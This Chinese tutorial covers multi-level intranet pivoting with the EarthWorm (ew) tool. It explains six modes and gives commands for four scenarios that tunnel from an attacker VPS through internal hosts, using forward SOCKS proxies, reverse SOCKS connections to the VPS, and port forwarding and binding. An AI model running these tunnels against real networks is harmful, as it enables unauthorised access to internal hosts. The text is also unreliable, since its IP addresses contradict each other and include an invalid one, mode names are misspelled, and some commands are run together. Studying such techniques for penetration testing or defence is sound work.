ew多级内网穿透

EW

ew六种模式

1.ssocksd--正向代理

2.rcsocks--流量转发

3.rssocks--socks5反弹

4.lcx\_slave--端口绑定

5.lcx\_listen--流量转发

6.lcx\_tran--端口转发

场景：

VPS:119.2.214.6

一层网络主机A公网IP:119.23.214.3,192.168.1.11

二层主机B IP:192.168.1.10,192.168.2.11

三层主机C IP:192.168.2.10,192.168.3.1910

核心层D IP:192.168.3.18

场景一：A有公网IP

A:ew -s ssocksd -l 888

外网通过代理到119.23.214.3:888 端口即可

![](../Images/895b3acde2df601a569ad9fc17f8c850.png)

 

![](../Images/73c0941a96a14f2b4e317439f2fdafee.png)

 

场景二：B没有公网IP--请求转发+socks反弹

*   
*   

```
VPS:ew -s rcsocks -l 1080 -e 888A:ew -s rssocks -d 192.168.214.146 -e 888
```

  

外网通过代理到119.23.214.146:1080 访问1080就可将代理请求转发到 A主机

![](../Images/b857389715699c1827c67d31cfbb6d95.png)

 

![](../Images/98198479fa2de9131f78e298c30a5b90.png)

 

场景三：存在AB二层网络 ，A有公网IP--B层正向+A端口转发

*   
*   

```
B:ew -s socksd -l 888A:ew -e lcx_tran -l 1080 -f 192.168.1.10 -g 888
```

  

B 开启正向代理，A开启端口转发，将A的1080端口收到的代理转发给B的888端口，则访问192.168.1.10:1080就可访问B层主机

![](../Images/22ffd55547fc8b65e0b1ebdaf6790373.png)

 

![](../Images/7008225643f04ac6639a325c8afd1d24.png)

 

![](../Images/3e384d299362c5949bd86ef42f5f39de.png)

 

场景四：二层网络，A无外网IP--vps流量转发+B正向代理+A作为跳板端口绑定

*   
*   
*   

```
VPS:ew -s lcx_listen -l 1080 -e 888B:ew -s sscoksd -l 999A:ew -s lcx_slave -d 119.23.214.6 -e 888 -f 192.168.2.10 -g 999
```

  

VPS将1080的代理请求转发到888, 二层网络B正向监听999，A作为跳板，将VPS888端口与B的999端口绑定，当访问192.168.214.146时，则访问的B的999

